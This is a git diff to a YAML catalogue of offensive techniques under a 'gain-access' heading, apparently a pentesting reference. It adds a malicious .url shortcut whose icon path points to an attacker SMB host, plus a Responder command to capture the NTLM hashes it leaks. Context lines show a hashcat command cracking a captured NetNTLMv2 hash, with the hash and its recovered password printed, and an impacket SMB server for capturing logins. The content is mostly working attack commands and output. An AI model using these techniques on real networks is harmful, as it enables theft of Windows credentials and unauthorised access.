@@ -1,7 +1,7 @@
 ---
 functions:
   gain-access:
-    - description: Embed a Macro into a MS Word Document
+    - description: Execution via SCF File
       code: |
         > cat fa.scf                        
         [Shell]
@@ -21,7 +21,18 @@ functions:
         hashcat -m5600 SMB-Relay-SMB-10.10.11.106.txt /usr/share/wordlists/rockyou.txt --force
 
         TONY::DRIVER:efc9b5e721ae752b:d38bd53794bb9dd185ca56d24820d13c:0101000000000000d426fc6defe3d70159fee0a7b6c28ecf0000000002000c0044005200490056004500520001000c0044005200490056004500520004000c0044005200490056004500520003000c0044005200490056004500520007000800d426fc6defe3d701060004000200000008003000300000000000000000000000002000003c71a28b04c2dcb184ab0f5b692eb7458b019b6a866dd66c917136af69ec69030a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003800000000000000000000000000:liltony
+    
+    - description: Execution via URL Resolver
+      code: |
+        > cat link.url                
+        [InternetShortcut]
+        URL=whatever
+        WorkingDirectory=whatever
+        IconFile=\\192.168.49.165\%USERNAME%.icon
+        IconIndex=1
 
+        sudo responder -I tun0
+        
     - description: Generice SMB Authentication via Code Injection
       code: |
         impacket-smbserver share ./ -smb2support
